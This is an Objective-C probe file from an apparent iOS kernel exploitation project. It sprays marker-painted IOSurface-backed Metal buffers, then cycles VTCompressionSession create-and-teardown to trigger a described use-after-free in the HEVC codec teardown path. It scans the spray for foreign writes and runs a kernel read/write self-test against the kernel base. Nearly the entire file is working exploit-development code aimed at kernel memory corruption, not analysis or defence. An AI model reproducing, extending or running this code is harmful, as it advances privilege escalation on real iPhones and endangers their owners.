//
//  P147Lifecycle.m — the LIFECYCLE probe. p147.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  The 16463-class panic on 24A435 (the CORRECTED law) = a STALE-SLOT
//  UAF: the codec-instance teardown chain (release wrapper → codec
//  stop/close → instance teardown → the 3-slot array at ctx+0x147b0 →
//  per-slot reset → session-object reset → the list-init leaf) WRITEs
//  through a slot that held garbage. The userland precondition = a
//  session's codec instances dying and being torn down.
//
//  So the probe = FAST VTCompressionSession
//  create→prepare→encode→complete→invalidate CYCLES with the p027-
//  class spray LIVE, followed by the overshoot DISCRIMINATOR.
//
//  HONESTY: PANIC-POSSIBLE (the teardown chase class); a foreign-value
//  row = receipt-class evidence of a write we did not author, NEVER
//  hasKread; one tap per force-quit.
//
//  RETIRED on this lane: the NumberOfTemporalLayers property. It
//  appears NOWHERE in this probe — the knob is the CYCLE COUNT.
//

#import "P147Lifecycle.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "LabBandit.h"
#import "P007KreadLane.h"
#import "P007Board.h"

#import <VideoToolbox/VideoToolbox.h>
#import <CoreVideo/CoreVideo.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <Metal/Metal.h>
#import <mach/mach.h>
#import <mach/mach_time.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <pthread.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>

#define P147_BUILD    @"p147-lifecycle-v1"
#define P147_DEFAULT  24           /* the default cycle count          */
#define P147_CAP      200          /* the cycle-count cap              */
#define P147_SPRAY    64           /* the 0x41-group (held)            */
#define P147_MARKERS  16           /* the 0x53-group (held)            */
#define P147_LEN      0x4000       /* the 0x4000-class allocation size */
#define P147_FILL_A   0x41         /* the p027-class spray paint       */
#define P147_FILL_B   0x53         /* the marker-group paint           */

static NSMutableString *g_buf; static int g_fd = -1;
static pthread_mutex_t g_Lock = PTHREAD_MUTEX_INITIALIZER;
static void L(NSString *s) {
    NSString *o = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    pthread_mutex_lock(&g_Lock);
    if (g_buf) [g_buf appendString:o];
    if (g_fd >= 0) { const char *p = o.UTF8String;
        if (p) { write(g_fd, p, strlen(p)); fcntl(g_fd, F_FULLFSYNC); } }
    pthread_mutex_unlock(&g_Lock);
}
static void Lf(NSString *fmt, ...) { va_list a; va_start(a, fmt);
    NSString *l = [[NSString alloc] initWithFormat:fmt arguments:a]; va_end(a); L(l); }
static NSString *P147R(void) { NSString *r = [g_buf copy]; g_buf = nil; return r; }

static void p147_flushCB(void *_Nullable refCon, void *_Nullable e,
                         OSStatus status, VTEncodeInfoFlags info,
                         CMSampleBufferRef _Nullable sb) {
    (void)refCon; (void)e; (void)status; (void)info; (void)sb;
}

static void p147_bandit(const char *outcome) {
    static const char *arms[1] = { "main" };
    LabBanditSeedRow sr = { "main", "ok", 0 };
    char attr[288];
    LabBanditRegister("p147", arms, 1, &sr, 0, "p147 lifecycle auto-learn",
                      "ok", "survived", attr, sizeof attr);
    LabBanditRecord("p147", 0, outcome);
}

/* ---- stage 1: the live spray (HOLD law: released only at tap end) ---- */
static id g_hold[64];       /* the 0x41-group (strong; the HOLD law) */
static id g_mark[16];       /* the 0x53-group (strong; the HOLD law) */
static uint8_t *g_holdBytes[64];
static uint8_t *g_markBytes[16];
static int g_nHold = 0, g_nMark = 0;

static void p147_spray(id<MTLDevice> mtl) {
    for (int i = 0; i < P147_SPRAY; i++) {
        id<MTLBuffer> b = [mtl newBufferWithLength:P147_LEN
            options:MTLResourceStorageModeShared];
        if (!b) {
            Lf(@"[s1] 0x41-group[%02d] ALLOC FAILED (holding %d of %d)",
               i, g_nHold, P147_SPRAY);
            continue;
        }
        void *base = b.contents;
        uint8_t ok = (base != NULL);
        if (base) { memset(base, P147_FILL_A, P147_LEN); }
        g_hold[g_nHold] = b; g_holdBytes[g_nHold] = base;
        Lf(@"[s1] 0x41-group[%02d] buf=%p len=0x%x fill=0x41 hold=%d",
           g_nHold, (__bridge void *)b, (unsigned)P147_LEN, ok);
        g_nHold++;
    }
    for (int i = 0; i < P147_MARKERS; i++) {
        id<MTLBuffer> b = [mtl newBufferWithLength:P147_LEN
            options:MTLResourceStorageModeShared];
        if (!b) {
            Lf(@"[s1] 0x53-group[%02d] ALLOC FAILED (holding %d of %d)",
               i, g_nMark, P147_MARKERS);
            continue;
        }
        void *base = b.contents;
        uint8_t ok = (base != NULL);
        if (base) { memset(base, P147_FILL_B, P147_LEN); }
        g_mark[g_nMark] = b; g_markBytes[g_nMark] = base;
        Lf(@"[s1] 0x53-group[%02d] buf=%p len=0x%x fill=0x53 hold=%d",
           g_nMark, (__bridge void *)b, (unsigned)P147_LEN, ok);
        g_nMark++;
    }
    Lf(@"[s1] spray HELD: %d x 0x41-group + %d x 0x53-group (released"
       @" only at tap end — the teardown cycles run INSIDE this live"
       @" spray)", g_nHold, g_nMark);
}

/* ---- stage 2: the TEARDOWN-CYCLE BATTERY on a worker pthread ---- */
static long g_cycles = P147_DEFAULT;  /* the knob — NO temporal-layers property */
static long g_preset  = 0;            /* the row-preset arm (consume-once)      */
static NSString *g_refConObj = nil;   /* RETAINED — the ARC-thread law */
static void *g_refCon = NULL;         /* bare pointer into g_refConObj   */
static int g_batteryRan = 0;

static void *p147_cycler(void *ctx) {
    (void)ctx;
    /* the stage9 property pack VERBATIM: EncoderUsage=1, RCMode-20,
     * RealTime=FALSE — and NOTHING else (the temporal-layers property
     * is RETIRED on this lane; it appears nowhere in this probe). */

    /* ONE pixel buffer for the whole battery (create once, release at
     * the end — the cycles create/destroy only the SESSION). */
    CVPixelBufferRef pb = NULL;
    OSStatus pst = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                             kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                             NULL, &pb);
    if (pst != noErr || !pb) {
        Lf(@"[s2] CVPixelBufferCreate failed: %d (0x%x)", (int)pst,
           (unsigned)pst);
        g_batteryRan = -2;
        return NULL;
    }

    for (long c = 0; c < g_cycles; c++) {
        uint64_t t0 = mach_absolute_time(), ns;
        VTCompressionSessionRef session = NULL;
        OSStatus cst = VTCompressionSessionCreate(
            kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
            NULL, NULL, NULL, p147_flushCB, g_refCon, &session);
        OSStatus pst2 = -1, est = -1;
        if (cst == noErr && session) {
            VTSessionSetProperty(session,
                (__bridge CFStringRef)@"EncoderUsage",
                (__bridge CFTypeRef)[NSNumber numberWithInt:1]);
            VTSessionSetProperty(session,
                (__bridge CFStringRef)@"RCMode",
                (__bridge CFTypeRef)[NSNumber numberWithInt:20]);
            VTSessionSetProperty(session,
                kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
            pst2 = VTCompressionSessionPrepareToEncodeFrames(session);
            VTEncodeInfoFlags flags = 0;
            est = VTCompressionSessionEncodeFrame(session, pb,
                CMTimeMake((int64_t)c, 30), kCMTimeInvalid, NULL, NULL,
                &flags);
            VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
            VTCompressionSessionInvalidate(session);
            CFRelease(session);
        }
        uint64_t at1 = mach_absolute_time() - t0;
        { mach_timebase_info_data_t tb;
          if (mach_timebase_info(&tb) == KERN_SUCCESS && tb.denom)
              ns = at1 * (uint64_t)tb.numer / (uint64_t)tb.denom;
          else
              ns = at1; }
        Lf(@"[s2] cycle %ld/%ld: create st=%d (0x%x), prepare st=%d, "
           @"encode st=%d, elapsed %llu.%02llu ms%@",
           c + 1, g_cycles, (int)cst,
           (unsigned)((uint32_t)cst), (int)pst2, (int)est,
           (unsigned long long)(ns / 1000000ULL),
           (unsigned long long)((ns % 1000000ULL) / 10000ULL),
           (cst != noErr) ? @"  (create FAILED — battery stalled,"
                          @" see the honesty row below)" : @"");

        if (cst != noErr || !session) {
            Lf(@"[s2] battery STALLED at cycle %ld (create st=%d) — the"
               @" honest rows stand; the spray is STILL live for the"
               @" discriminator", c + 1, (int)cst);
            break;
        }
    }
    CVPixelBufferRelease(pb);
    L(@"[s2] battery done (N full create→prepare→encode→complete→"
       @"invalidate cycles; a clean return = the teardown survived");
    L(@"      this count with the spray LIVE beneath it)");
    g_batteryRan = 1;
    return NULL;
}

/* ---- stage 3: the overshoot DISCRIMINATOR (the p145 law VERBATIM) ---- */
static void p147_discriminate(void) {
    L(@"[s3] discriminator: every held allocation scanned byte-by-byte");
    L(@"    against its OWN fill marker (0x41-group vs 0x53-group");
    L(@"    separately). A foreign-value byte = the receipt row:");
    L(@"    receipt-class evidence of a write we did not author;");
    L(@"    NEVER a KRW claim (counts only, no raw dump).");

    unsigned totalA = 0, totalB = 0, pagesA = 0, pagesB = 0;
    for (int i = 0; i < g_nHold; i++) {
        uint8_t *p = g_holdBytes[i];
        if (!p) continue;
        unsigned foreign = 0, distinct = 0;
        uint32_t seen[256]; memset(seen, 0, sizeof seen);
        for (size_t j = 0; j < P147_LEN; j++) {
            if (p[j] != P147_FILL_A) {
                if (++seen[p[j]] == 1) distinct++;
                foreign++;
            }
        }
        if (foreign) {
            pagesA++;
            totalA += foreign;
            Lf(@"[s3] OVERSHOOT RECEIPT row: 0x41-group[%02d] foreign"
               @" bytes=%u, byte class=%s (receipt-class evidence of a"
               @" write we did not author)", i, foreign,
               (distinct == 1) ? @"single-class" : @"multi-class");
        }
    }
    for (int i = 0; i < g_nMark; i++) {
        uint8_t *p = g_markBytes[i];
        if (!p) continue;
        unsigned foreign = 0, distinct = 0;
        uint32_t seen[256]; memset(seen, 0, sizeof seen);
        for (size_t j = 0; j < P147_LEN; j++) {
            if (p[j] != P147_FILL_B) {
                if (++seen[p[j]] == 1) distinct++;
                foreign++;
            }
        }
        if (foreign) {
            pagesB++;
            totalB += foreign;
            Lf(@"[s3] OVERSHOOT RECEIPT row: 0x53-group[%02d] foreign"
               @" bytes=%u, byte class=%s (receipt-class evidence of a"
               @" write we did not author)", i, foreign,
               (distinct == 1) ? @"single-class" : @"multi-class");
        }
    }
    Lf(@"[s3] verdict: 0x41-group %u foreign bytes in %u/%d pages;"
       @" 0x53-group %u foreign bytes in %u/%d pages"
       @" (a CLEAN row = the spray held its own markers for the whole"
       @" battery)", totalA, pagesA, g_nHold,
       totalB, pagesB, g_nMark);
}

@implementation P147Lifecycle

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p147_lifecycle_log.txt"]
                 UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p147 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P147_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[law] the LIFECYCLE: the 16463-class stale-slot UAF (the");
    L(@"  corrected law = a teardown WRITE through a garbage slot —");
    L(@"  the 3-slot array at ctx+0x147b0; the userland precondition =");
    L(@"  a session's codec instances dying and being torn down). So:");
    L(@"  64 held 0x4000-class IOSurface-backed buffers painted 0x41 +");
    L(@"  a 16-surface marker group painted 0x53, HELD for the whole");
    L(@"  tap, then N FAST VTCompressionSession");
    L(@"  create→prepare→encode→complete→invalidate cycles on a worker");
    L(@"  thread (the stage9 property pack VERBATIM), then the");
    L(@"  discriminator reads them back marker-vs-bytes.");
    L(@"[!] PANIC-POSSIBLE (the teardown chase class); ONE tap per");
    L(@"  force-quit.");
    L(@"[-] RETIRED on this lane: the NumberOfTemporalLayers property");
    L(@"  (it appears NOWHERE in this probe) — the knob = the CYCLE");
    L(@"  count.");
    L(@"[honesty] a foreign-value row = receipt-class evidence of a");
    L(@"  write we did not author; no KRW claim; hasKread stays");
    L(@"  kread32-gated.");

    /* the knob: the cycle count (Documents/p147_cycles.txt, decimal,
     * default 24, cap 200). The ROW-PRESET law: an explicit preset row
     * (setPresetCycles:) OVERRIDES the file for THIS tap — consume-once,
     * the source named honestly (the afc-wedge ladder arm: the p146
     * ladder's push channel is the wedged one; the preset rows need
     * NO push). */
    long cycles = P147_DEFAULT;
    if (g_preset > 0) {
        cycles = g_preset;
        Lf(@"[*] ROW PRESET: cycles=%ld (overrides the knob file;"
           @" consume-once — the no-push ladder arm)", cycles);
        g_preset = 0;
    } else {
        NSString *knob = [NSString stringWithContentsOfFile:
            [docs stringByAppendingPathComponent:@"p147_cycles.txt"]
            encoding:NSUTF8StringEncoding error:nil];
        if (knob) {
            long v = strtol(knob.UTF8String, NULL, 10);
            if (v > 0) cycles = v;
            if (cycles > P147_CAP) {
                Lf(@"[*] knob file present: cycles=%ld > cap — CLAMPED to"
                   @" %d", cycles, P147_CAP);
                cycles = P147_CAP;
            } else {
                Lf(@"[*] knob file present: cycles=%ld", cycles);
            }
        } else {
            Lf(@"[*] no knob file: cycles=%ld (the lifecycle default)",
               cycles);
        }
    }
    g_cycles = cycles;

    /* ---- STAGE 1: the LIVE SPRAY (held) ---- */
    id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
    if (!mtl) {
        L(@"[-] STOP: MTLCreateSystemDefaultDevice nil (no Metal device)");
        p147_bandit("nodevice"); return P147R();
    }
    Lf(@"[s1] Metal device: %@ (IOSurface-backed buffers, 0x4000-class)",
       [mtl name]);
    /* the refCon: RETAINED before the thread (the ARC-thread law — the
       bare-bridge on the arc-local docs = the 0x10-release crash class) */
    g_refConObj = [docs copy];
    g_refCon = (__bridge void *)g_refConObj;
    p147_spray(mtl);

    /* ---- STAGE 2: the teardown-cycle battery INSIDE the live spray ---- */
    g_batteryRan = 0;
    pthread_t th;
    if (pthread_create(&th, NULL, p147_cycler, NULL) != 0) {
        L(@"[-] STOP: pthread_create failed (the battery thread)");
        p147_bandit("nofthread"); return P147R();
    }
    pthread_join(th, NULL);
    g_refCon = NULL;
    g_refConObj = nil;
    if (g_batteryRan == 1) {
        p147_bandit("cycled");
    } else {
        p147_bandit("battery-failed");
    }

    /* ---- STAGE 3: the overshoot DISCRIMINATOR ---- */
    p147_discriminate();

    /* ---- release the spray (tap end only) ---- */
    for (int i = 0; i < g_nHold; i++) { g_hold[i] = nil; }
    for (int i = 0; i < g_nMark; i++) { g_mark[i] = nil; }
    mtl = nil;
    L(@"[end-spray] the spray released (tap end; the HOLD law kept it");
    L(@"  live beneath the teardown cycles for the whole battery)");

    /* ---- the honest KRW self-test tail (the p142 v3 gate) ---- */
    L(@"=== STAGE GATE (honest KRW self-test) ===");
    {
        P007Board *brd = [P007Board shared];
        uint64_t kb = brd.kbase ? brd.kbase : P007LaneKbase();
        P007Kread32Fn rfn = [brd kread32Fn];
        BOOL pass = NO;
        if (kb && rfn) {
            BOOL okNo = NO;
            pass = (rfn(kb, &okNo) == 0xfeedfacfULL) && okNo;
        } else if (kb && P007LaneLive()) {
            pass = (P007LaneKRead32(kb) == 0xfeedfacfULL);
        }
        if (pass) {
            Lf(@"  KRW SELF-TEST READ: PASS (kbase=%#llx)",
               (unsigned long long)kb);
            p147_bandit("selftest-read-pass");
        } else {
            Lf(@"  KRW SELF-TEST READ: FAIL/HOLD (board-kbase=%lld lane-kbase=%@)",
               (long long)brd.kbase,
               kb ? [NSString stringWithFormat:@"%#llx",
                     (unsigned long long)kb] : @"0");
            p147_bandit("selftest-read-fail");
        }
        Lf(@"  board: %@", [brd kreadSignal]);
    }
    Lf(@"=== p147 end %@ ===", LabLocalMilitaryNow());
    return P147R();
}

/* ---- the row-preset arm (the no-push ladder; consume-once) ---- */
+ (void)setPresetCycles:(long)v {
    if (v <= 0) { g_preset = 0; return; }
    if (v > P147_CAP) v = P147_CAP;   /* the cap law holds for presets too */
    g_preset = v;
}

@end